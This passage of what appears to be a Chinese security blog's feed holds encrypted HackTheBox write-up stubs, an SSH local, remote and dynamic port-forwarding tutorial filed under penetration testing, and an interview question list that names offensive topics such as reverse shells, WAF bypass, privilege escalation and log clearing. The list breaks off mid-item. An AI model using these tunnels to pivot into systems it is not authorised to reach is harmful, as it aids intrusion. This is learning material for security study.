        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="52a3ae31d418e2412fff3b28e44424ac586706e5fe5a7919bb16443d58424e9f">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259614437644d13c3b329af8fec292588f087170e3b132069128f59d9012ce0f60f57b4730dfc4ba4d93b5817ab4026b0b977f528a2e344bc5a1ad5024aef459d92b5a2d2a0e92446c8597731c5793c9a23cd960c6780199696bc394ea8d964d921488c2f352906f24ec23540acdf4dbc1349aa46655ad3c87e84c51845f2d50b09c3fa5eb3e30e924e111611b96853c852af39eb1c625922d51d18e2ea9ce80dd03554a5af208cc9352957f952d846b033317e32ddbce16759aabab8f0b5e7611f567c7976b9f84619a03437f935886a9c831b57b9be48eb5953ea8fdca20146fa511eac41f399a5178c2a6a286a4e40929c68d9c9e2610dc35da19547d2ca124b4dd43547c4afd7ce0d61920bc28b9c138a2ee371b5b5520e768b8731f158d692c9cf6039c61cbf708e823991dfc98dc8d9a53f08619e30c2ace0e7e891f0cf196e4639ca5336dd125761679d76b5f1e25e6c1d3470c095a3e898e8844627e44b03cf72cb5459a4f134f7f02a6cf460bd8bc1156a74dbe88843e40f2938327eda6dde48195d2e866cf6b1fe0cdeaa3599c000c4666cc861ae0bdeeaeddde06d590e765e2eed73110bc9e63ffcad1f4177b80995b608090b38730c0411553552eb5fe5abf356deb5ab8b11b25df48c60c391ff360a86b10c04f4ea5d58a85eaee54d359315ec584aab2a17e5f0cfb10b3371a0d30f61f0d8bf9e58299b3440ec2d791b80d758b413c63fe1c13629a16cc9c3232698a91cd7756660a3d2762b0076368ad186729cc559a606fb1eff01741e534ad39d3c7abdd749e46f839dc72f7d0b290dd3081f2df7ecf7da62e5294d166b4664631ba6c155cc706bac03bba050b10cd0fcea3c784f4e4a0127772cf0714452611bc623aad1f8a9a506e60be0ccde96cc342670868fb43acc3e1e03b811e5adc0bbdb7e4bacdc63aca60624c5d46f012cd98dde0ba40321f77a185644b8533c8d244cb39a86ed80500b666bdb160990d1a85feb2d98d452387c800c3077050000a2a0dc96b1c25532a20ac3496ebd5432de1d2eb0e9fcd6cc6c72c9cf23eb34be562a1411e51e48f7a8ba64da37fc8ed95c36ea196e2d7024ccbf7d86b3f2a970560cac204585f53b99f1ea5da21f225db1083c2c7735cb71e6d2c78726a460dacd36d20efde60b2214671e7655e0c8d01f6f9b753e577fa417dd3c3e90287408771224599202c5d8aca479bb317592b6fc95ef93fec3621a2ff63b769a0c5d444374344c21fcb805d8cfe8b1016b89401356ed5156a91acc340f42c5a94ce3ea11942334c7184a927d0cbe50a6d36509c7016b74147f1ec9e5a93cc7c104e0d551151ad852f9651190a3af62ee7aed016a49055aa7d586a7fc96028c8c9d987c35b52be32c3f0d1489a23337639b7ca62c0a6caa298d1aecaf0092b0cd635a489c4e9524cd385ec1c5074848e445d3b70bd0dfdb4b37fe031e55f9e1e6bb1b986fa0d8311b466af16d61d88dd9a56a5918bd4b81e1de7251ac058e03249d967cbb62068f168e923f538e9bcf73644bbffe0aabe38fa955e8eb046f74de925a4d111d3947861f6b862a8801e1cc2c174df69bb8ca001870e682a3f8894b3eff895bba20fb87559e27552b77f6d19a4caea7d3cb05489c6135343af8e1b17494b74684461f1d16ae8442f6686c8f4acdc2bfc99a374adea733d871a14c75092d3c4733694550abdb6ed09ff776afdb369dd7a597185c1918a55cf08fce52af7072139ba0c8eca0214f1aa8a35e7139cf1719f04d565b52ff7320e7e78d80821b294e543a601a27e1ba34f6bc1eece719a6274442466c24df4524506e037f7d3e5dbf5227a1f8156997811f08c88e480da400002467664b2c838affbd5c1b73a9a85eae16e5d7c68e5ec8fa79ef860b5800e7a00cd3bec09ec314f2c38df1ae948356285e057fda4a0e200e61625705397f6055b47e49e99c2dd7c7438c0b9f8b6a50c7986956deb229b172927122d888ffa73edf65b10a7ae74e4c48c4436aa6d9c3de1df313ef6c4c6fe493bca5b5563f9b0c554223c1b81b429779aff3dadc1eafa0164c0258fb30cc8798e98a50d2d044ea35bb717a1a0cbf978ff57bcb0dd30f9337aaebfd6ed4ba1f87161a796e708f7920a4e85062202e6a4862c3da36d935a5ff7b16515dbd89e070c27325a6ead7c288b850457e16d3599e394e1c2dcf8f16626d7b53925a8e735fcc9d60770b135845b35bdb84771789a5ef17034990063e054a28252294590b6a92951e61cca82dc803054e4a0706043bfaf9140dccc0f68755ac7b02bfd7e10db21ec3e33d2c784050a2eca16ae0b550324760c4f2e97b6469ad7c119ba6f04d8bfe21b61fcea5410cc5f62c05f41c3a0fe4231b860bf47337e9fe63118d6b269eea5358394b7a4f811cb65430e8a231c484a0d3b19c3127402b7dddf3b7ae509d251ba0c90a16cd4fd8bcb2efe4558804f83a4716284cf44b6e5f7f8fd5a36c3dc3c7c20e0d96418cd12ee1934026d54266d8bad7bd1c86d4dd981953817ea8a4492dcfc73db002e9572d7d19502ae99c06d842e0408d67ce5309211dec1578a3087a298a260556ed7b5d9fbdd22c391d4989c8496ed0baab345d036200ec4d69ac6d3e99476d41a0a5c0cec82b83e85843dfe94d49207bae9dd4e9287f809d8aec7315ed144768b201a41305ffb9ea30378042aef796e460bc632b4c28b790581e678dbf0b4841c7877bb05fc7e2dfa6f3b1fde7986d04dc8e5abe4ec6788322ef3dee56c262d015d4934d9fe07c386e642b799280e55b65571e555ca5cc2491b3e790b9f7413483f52a6eaaf74cda88c0759a90a6fc24960d1d6b15b663942bf22eb9d7ac9704a92945dda1f543278febf21a9a7b6eb5f67ed6a0db0a4ff6a0a49b188d62849afee1906b1c74b9786ad16c670a410eeec33fff6872a53224316c615c716684ded1b991a24249dd80a105b156a1142d558ca7dd5e33e56307a2795ce9f8a5098a60b615c54975f5689fa45f7725a2c01f89fb196af6c694d3d2f94d40586db41ca9ff7a5a0b58c18085edd32f1cc735799c9f8101a919e5dc25191af684adbe9ce280f68b14db43e740b06f13a5986f46f8839c1a969267d04160026bd3fc4f7c25c2ec281cef10f33538f98f4b47a632ce867dd7ee1730306473a319f7807253f14ebd2395c8d679dd1c86678768479ee706ee9b515934a088a34525c4909f229c9631cea3ab010cd452a0140621ace5231b6eb3a01713a810801296e243b5f8e80fe20b561b9d15cf9475aa4c54a494a613a128058db961c5897d58ce2447e75b6b97edd806758b2104cb24032a8e712d28d49ee04f582c0b3e06f200c4bb433ddee0aec12ebc7b4e9b9832d81266ce28dcd91c63c6e718a3166daafb449ba51126ad7a43c9c32835a0157a7da2bca5c223543818909b0392e4bde1f021d1811a65ec3fc7c484a67ac2ae505530cb610403018e00b7e7140df26646cd9f0ba270554c2cf21aa433c290b4c99ff3971d95bf19dd93c9623f4de74048c8a679cf8570466fe8d0a7cd077507bd2b52f6287e424f24acd152b1a7a12dbd2398007b0bb651adb5d638b58a5128fea120f9b0f8ab90b30ee26948f5c95bb12ddc1e0fe765830d88faaca60d70940cf7e4348f53820df1ecce0fd9c8f685f1339b74ac7aeeac23c82424c477cd54b8c0c73ca90029ac336aa3f7b9cc88c6a53fc4684d4e120c184347dfa6232dce52927f268c0f4bc26b5743134c348372a63c7796e73f4da80b1e1a32d01220dabd20951cc5e2993c50e42ce5c8c2c129ff8c6fb0d8407e08d1bc2da92a17402067a1f08b36de8a1227c071be6a09138c65be8511ada15ac7c2b739c4fd34d2a0f97174d698f57e7182c52e382f34ff97c71a3f379893d88e3068b1c6c91e44a7fe7efb4b6744f4c427f9ef2d242186e36c23f89902947c61783930b3717503b0cfc68fc127bbdd8af47ecd98aa061b7cba54da6c032cc49fd8cb22847c01723d41084ca802ee6d24735b2c0b59efa7c32f3f24e0e271b29b445c7b8085f92ed6240cb5457ce8844fb1a8c00fd549e7c1c3666fdd36abef325bedd4d986369c33f424ac62219e893089c9717814148dc34066573cfec55700fc5f820e419daddb601e9f36612a9034e1bf4422cc1d6c03593ca13627d9229e4efa4a0a323b503f876e3adbe672a1c6f5fbb8360ba4b013d70022a612408506148ccf491bc2b9aaf9caae4669fea468a16d09440d7c491a753e6e4b32afe93bd4864df38233680d526fc95fcbe6221fd1ab1f5b40e37ed580c1ec3dba77280e9ba19ff1f730d665920af14b376fa60bb89eee3734934597524354e6dfa85d8607ebbd96c9001f9da0799d1ba393727a7bfadcb834a114cddcaf111d03b383ced03fe4e5cf242f954c2b3971394ea8426b078ba49da5daab97a9bc82f1032dc22833c88ad7c703c139d29cd4363108e558a9c818dd4a1da115a4c62e77b615a37408a15e3d531fed4257b7755b2a5a41f88dd74d73c1376b1312a06c0a269b18640a6e5dfa5f8f9628afebcbf5a514d0db900d9e69452082ed2c9db76c2f7d5f439889dce54a7982b173dc2c65af99f1d719c998849a7d093ed6409c1dc6ad60bd6088e5e5a5fddc5fba4def668e9a5c76a17256b9dfe6b8b9fdfaec56858145c4a41ccc2f1a1fef26d71fc5e46f30e83e3c8bc42503b30a25109b4d80a37c5723d59c9a9f10b2513f3057a360a7a4070261c3a3d09ca52951c00dae2bf681e3d5436bdeca18437f2d67346cbaf0301f3dcb0cc69ea94d1360219985dd80a582bdd2e70efb0d22e18f5e3bc3da296de2d4c7a535d04cf8be45cc1fc597296499af92d52e858469c96a18fdfc637487f05905ac3f9cbfe17432bbe997c703f3c61b9001e5ac47a93e6180f8aac7c0dd558ed1802074e3e29eb4d4074085408c281a485388cf00695b30a0042fb823ff13d5eff7c1316356a8aecefc600e21588e93fa539948206a8cb2e5e05ee5df3e32387611c42546dd558b14ef2883c6c7120160813aec24e77</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> HTB </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应</title>
      <link href="/2024/11/13/2024-09-19-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/11/13/2024-09-19-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>防御是安全行业中根本技能</p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>攻防演练是指模拟真实的网络攻击事件，对网络安全防御能力进行检验和提升的一种训练活动。攻防演练的目的是检验网络安全防御体系的有效性，发现安全漏洞，提高网络安全防御能力。攻防演练的主要内容包括网络攻击、网络防御、网络监控、网络溯源等。</p><p>网络安全的应急响应是指在网络安全事件发生后，对事件进行处理的过程。应急响应的目的是尽快恢复网络服务，减少损失，保护网络安全。应急响应的主要内容包括事件的检测、分析、处理和恢复。</p><p><a href="/../assets/img/%7B78EC29F4-4B78-43B8-949B-FD13F0B272E4%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7B78EC29F4-4B78-43B8-949B-FD13F0B272E4%7D.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows基础-NTFS 与共享权限</title>
      <link href="/2024/11/13/2024-09-18-windows%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/11/13/2024-09-18-windows%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="45b930a8a139527ae3d9b93054f32e61de2003771bda936fcebb17629ca77e73"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MonitorsThree</title>
      <link href="/2024/11/13/2024-09-16-MonitorsThree-htb/"/>
      <url>/2024/11/13/2024-09-16-MonitorsThree-htb/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="d7f3aa31de1bfd118460e57fc4ce1b37b8646eb98e37842c71082b36421335b0">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259614437644d13c3b329af8fec292588f08293da32110535a518284c8437a5b97318799e9e1ef1917620a3cbe99761b062351ae499996b72b13c1323944a3e8eefe7659db3482da2bcf21718f5e2258a92a9c19cfb470ebc38e81b0c680c49b79f9bf79ae562ae244899b3f082dc4cc9e5f2ef423590e7f615b3c7472b5b58486aa93417c12d231ff2b25b0f429569c95997f4ae911a30c1cf123625348299cdfb76294e50dd7392e2491453e5f9d1ef5e5e6735dd7cceecfa6a0167a7d446c23645e13c7bc9eaae55fe69af8bbbf5c134785662f3184763f2a51fa99371a7fe214420bfb511c93a7c63eab6cdae5333f2afa530227e5d09edd621c24180fd93e4630bdbe84588520bbe07d9ac26ac116a201e87c7e25b0a1b50e09303542d214d2203ad54f92df5d36169602851bfb371fbf8fc7ca72827fc0dcbc00d7a6a9ac4f2e035d7a0ba16c3ab642379d9ee81be585def1f82ffcce44676ccc04461afc9c8989107f00b810204f04a82cbc370361e03f5d3b6c0d58a6d3346dad323dc1abcf0b88df8b281d46ab742431c745914ca6591012a71a0cf1f3ddd5a71822afbb58bc5483c8f740a9a6081096448dcb1549c220ac442b77e7f198747ed02ef3fc66c50c0872f135ccdd20ccdae98503ec32142ce20245222d4285d40cfc86c4fd4c5772de3c941f116396928be90b33d67bfdf68bdecdad522900f91889c7aef07525a3999b0b245de6dbb79959bcbffa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> HTB </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/13/2024-09-16-HTTP%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/11/13/2024-09-16-HTTP%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="48ecebd6f170dc991cae7b6270b7b8f3b94ed66362959eb6c0e1da1b1ec0f45a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学会SSH端口转发</title>
      <link href="/2024/11/13/2024-09-13-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2024/11/13/2024-09-13-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="SSH-有三种端口转发"><a href="#SSH-有三种端口转发" class="headerlink" title="SSH 有三种端口转发"></a>SSH 有三种端口转发</h1><p>**本地端口转发(Local Port Forwarding)**，<br>:logbook:<br>  CLOCK: [2024-09-13 Fri 11:06:21]–[2024-09-13 Fri 11:06:22] &#x3D;&gt;  00:00:01<br>  CLOCK: [2024-09-13 Fri 11:06:23]–[2024-09-13 Fri 11:06:28] &#x3D;&gt;  00:00:05<br>:END:<br>远程端口转发(Local Port Forwarding)<br>动态端口转发(Dynamic Port Forwarding)</p><h1 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h1><p>vps启动一个9000的服务，但是防火墙是关闭的，现在不需要开启防火墙如何进行访问呢，（22端口开启了）</p><h1 id="SSH-有三种端口转发-1"><a href="#SSH-有三种端口转发-1" class="headerlink" title="SSH 有三种端口转发"></a>SSH 有三种端口转发</h1><p>**本地端口转发(Local Port Forwarding)**，<br>:logbook:<br>  CLOCK: [2024-09-13 Fri 11:06:21]–[2024-09-13 Fri 11:06:22] &#x3D;&gt;  00:00:01<br>  CLOCK: [2024-09-13 Fri 11:06:23]–[2024-09-13 Fri 11:06:28] &#x3D;&gt;  00:00:05<br>:END:<br>远程端口转发(Local Port Forwarding)<br>动态端口转发(Dynamic Port Forwarding)</p><h1 id="本地端口转发-1"><a href="#本地端口转发-1" class="headerlink" title="本地端口转发"></a>本地端口转发</h1><p>vps启动一个9000的服务，但是防火墙是关闭的，现在不需要开启防火墙如何进行访问呢，（22端口开启了）<br><a href="/../assets/img/image-99.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-99.png" alt="alt text"></a><br>本机执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 2000:localhost:9000 root@118.26.39.189</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/image-100.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-100.png" alt="alt text"></a></p><h2 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h2><p>本地机器启动一个8000的服务 ，vps需要访问这个服务，如何实现，本地机器没有公网IP<br><a href="/../assets/img/image-101.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-101.png" alt="alt text"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -R localhost:2000:localhost:8000 root@118.26.39.189</span><br><span class="line">ssh -R 2000:localhost:8000 root@118.26.39.189</span><br><span class="line">ssh -R 2000:192.168.0.100:8000 root@118.26.39.189</span><br><span class="line">同理</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/image-102.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-102.png" alt="alt text"></a></p><h2 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h2><p><em>远程云主机B1运行了多个服务，分别使用了不同端口，本地主机A1需要访问这些服务。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D localhost:2000 root@118.26.39.189</span><br></pre></td></tr></table></figure><p>还是开设9000<br><a href="/../assets/img/image-104.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-104.png" alt="alt text"></a><br><a href="/../assets/img/image-105.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-105.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口转发 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全面试题</title>
      <link href="/2024/11/13/2024-09-10-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2024/11/13/2024-09-10-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li><strong>漏洞相关</strong>：<ul><li><strong>挖洞经历和CTF经历</strong>：要求介绍自认为有趣的相关经历。</li><li><strong>常用漏洞</strong>：包括平时用得较多的漏洞及其原理、修复方案，如SQL注入、上传Webshell等。</li><li><strong>开源组件高危漏洞</strong>：要求列举所知道的所有相关漏洞。</li><li><strong>CVE或POC</strong>：需要描述深入研究过的CVE或POC。</li><li><strong>反序列化漏洞</strong>：包括php&#x2F;java反序列化漏洞的原理和解决方案。</li></ul></li><li><strong>工具相关</strong>：<ul><li><strong>常用工具</strong>：询问平时使用的工具及其特点。</li></ul></li><li><strong>绕过WAF</strong>：<ul><li><strong>SQL注入和上传Webshell</strong>：遇到WAF时的应对方法。</li></ul></li><li><strong>系统提权</strong>：<ul><li><strong>Windows和Linux系统</strong>：阐述提权的思路。</li></ul></li><li><strong>渗透测试</strong>：<ul><li><strong>获取目标网站真实IP</strong>：介绍绕过CDN获取真实IP的思路。</li><li><strong>渗透测试思路</strong>：针对给定网站，阐述渗透测试的思路。</li><li><strong>实际渗透测试经历</strong>：可能会询问相关经历。</li><li><strong>反弹shell</strong>：常用命令、常反弹的shell类型及原因。</li><li><strong>SSRF漏洞</strong>：包括成因、防御、绕过等方面。</li><li><strong>SQL注入</strong>：漏洞成因、防范方法、注入方式、利用方式、中间件解析漏洞利用方式、bypass技巧、宽字符注入原理及修复等。</li><li><strong>获取webshell的思路</strong>：针对特定注入点，如test.jsp?cid&#x3D;150，获取webshell的思路。</li><li><strong>变形注入的思路</strong>：对于存在SQL注入漏洞的变形注入，提出解决思路。</li><li><strong>mysql注入的区别</strong>：mysql 5.0以上和5.0以下网站注入的区别。</li><li><strong>sqlmap的使用</strong>：sqlmap对注入点注入以及注入post包的方法。</li></ul></li><li><strong>浏览器知识</strong>：<ul><li><strong>跨域请求数据</strong>：如何设置跨域请求数据，jsonp的作用。</li><li><strong>同源策略</strong>：子域名和顶级域名不同源时的设置方法，同源策略的解释及同源可获取的东西。</li><li><strong>JSON和JSONP的区别</strong>：包括JSONP劫持利用方式及修复方案、JSON注入利用方式、Ajax是否遵循同源策略等。</li><li><strong>CSP</strong>：CSP是什么以及如何设置。</li><li><strong>浏览器安全策略</strong>：不同浏览器（如chrome、firefox、IE）之间安全策略的不同。</li><li><strong>HTML5安全特性</strong>：HTML5新的安全特性。</li></ul></li><li><strong>XSS</strong>：<ul><li><strong>防范XSS漏洞</strong>：在前端和后端的防范方法，以及何处更好及原因。</li><li><strong>检测XSS漏洞</strong>：黑盒检测XSS漏洞的方法。</li><li><strong>利用XSS盲打漏洞</strong>：在内网且只能内网访问的情况下，利用XSS盲打漏洞的方法。</li><li><strong>防御蠕虫</strong>：防御蠕虫的方法，以及在社交类网站中蠕虫可能出现的地方。</li><li><strong>XSS持久化</strong>：相关内容。</li><li><strong>构造蠕虫的条件</strong>：拥有XSS漏洞时，构造蠕虫所需的其他条件。</li><li><strong>XSS的发生场景、定义及修复方式</strong>：相关内容。</li></ul></li><li><strong>CSRF&#x2F;SSRF</strong>：<ul><li><strong>区别</strong>：CSRF、SSRF和重放攻击的区别。</li><li><strong>防御CSRF的方法</strong>：包括JAVA的防御方式以及token是否一定有用。</li><li><strong>CSRF漏洞的本质、定义及修复方式</strong>：相关内容。</li><li><strong>SSRF漏洞原理、利用方式及修复方案</strong>：以及Java和PHP的SSRF区别。</li></ul></li><li><strong>XML注入</strong>：<ul><li><strong>XXE</strong>：XXE是什么以及修复方案。</li></ul></li><li><strong>业务逻辑漏洞</strong>：<ul><li><strong>类型及修复方式</strong>：至少说出三种业务逻辑漏洞及其修复方式，如找回密码、身份认证、验证码漏洞等。</li><li><strong>越权访问</strong>：水平、垂直、未授权越权访问的区别，以及越权问题的自动化检测方法。</li></ul></li><li><strong>Java考察</strong>：<ul><li><strong>MVC结构和数据流向</strong>：java的MVC结构的作用，数据流向数据库的顺序。</li><li><strong>java沙箱</strong>：对java沙箱的了解。</li><li><strong>ibats和sql注入</strong>：ibats的参数化查询对sql注入的控制，以及可能造成sql注入的危险方法。</li><li><strong>struts2漏洞原理</strong>：两次struts2漏洞的原理。</li><li><strong>ongl在payload中的作用</strong>：相关内容。</li><li><strong>\u0023字符编码</strong>：\u0023是什么字符的16进制编码以及在payload中使用的原因。</li><li><strong>执行系统命令的漏洞</strong>：java是否会发生此类漏洞，以及相关的语句和方法。</li><li><strong>修复xss漏洞的层级</strong>：在java程序中修复xss漏洞的层级。</li><li><strong>xss filter的设置位置</strong>：xss filter在java程序中的设置位置。</li><li><strong>java类反射的安全问题</strong>：相关内容。</li><li><strong>Java反序列化漏洞</strong>：原理和解决方案。</li><li><strong>java框架</strong>：了解的java框架。</li></ul></li><li><strong>PHP考察</strong>：<ul><li><strong>LFI本地包含漏洞</strong>：原理、代码示例、手工发掘方法、无报错回显时的文件遍历方法。</li><li><strong>php反序列化漏洞</strong>：原理和解决方案。</li><li><strong>php webshell检测方法</strong>：相关内容。</li><li><strong>%00截断的原理</strong>：相关内容。</li><li><strong>php.ini的安全特性设置</strong>：相关内容。</li><li><strong>php避免错误回显的方法</strong>：相关内容。</li></ul></li><li><strong>常见中间件</strong>：<ul><li><strong>Redis未授权访问漏洞</strong>：入侵利用方式。</li><li><strong>中间件解析漏洞利用方式</strong>：常见的中间件解析漏洞利用方式。</li><li><strong>JAVA中间件容器</strong>：常见的中间件容器。</li><li><strong>tomcat安全加固</strong>：相关内容。</li><li><strong>tomcat重启后的情况</strong>：相关内容。</li><li><strong>常见网站服务器中间件容器</strong>：相关内容。</li></ul></li><li><strong>数据库安全</strong>：<ul><li><strong>mysql表权限</strong>：除增删改查、文件读写外的其他权限。</li><li><strong>mysql安全</strong>：mysql安全的做法。</li><li><strong>sqlserver public权限提权</strong>：相关内容。</li><li><strong>加固降权思路</strong>：Windows、Linux、数据库任选其一的加固降权思路。</li><li><strong>mysql用户信息存储</strong>：mysql的用户名密码存放的表以及密码的加密方式。</li><li><strong>mysql默认库</strong>：mysql数据库默认的库名。</li><li><strong>mysql UDF提权</strong>：5.1以上版本和5.1以下版本的区别及所需条件。</li></ul></li><li><strong>Linux操作系统</strong>：<ul><li><strong>系统安全加固</strong>：简述Linux系统安全加固需要做的方面。</li><li><strong>后门检测工具</strong>：使用的工具来判断系统是否存在后门。</li><li><strong>Selinux</strong>：Linux的Selinux是什么以及如何设置。</li><li><strong>iptables工作层</strong>：iptables工作在TCP&#x2F;IP模型中的哪层。</li><li><strong>系统防护</strong>：无法升级内核时，保证系统不被已知exp提权的方法。</li><li><strong>日志相关</strong>：syslog中的日志类型、安装软件的日志位置、ssh登录日志的查询、syslog日志格式的配置、syslog的查看方式及是否为二进制文件。</li><li><strong>应急响应</strong>：Linux服务器被入侵后的应急响应方法。</li></ul></li><li><strong>应急响应</strong>：<ul><li><strong>后门实现方式</strong>：有哪几种后门实现方式。</li><li><strong>webshell检测</strong>：webshell检测的方法思路。</li><li><strong>Linux服务器中木马后的应急思路</strong>：相关内容。</li><li><strong>新0day应急响应</strong>：遇到新0day（如Struts2）后的应急响应方法。</li><li><strong>安全评估和审计</strong>：新业务上线前的安全评估方向，现有系统审计发现安全风险的方向。</li></ul></li><li><strong>其他</strong>：<ul><li><strong>判断网站CMS的意义</strong>：判断出网站的CMS对渗透的意义。</li><li><strong>清理入侵日志</strong>：相关内容。</li><li><strong>总结渗透报告及修复方案</strong>：相关内容。</li><li><strong>收集目标站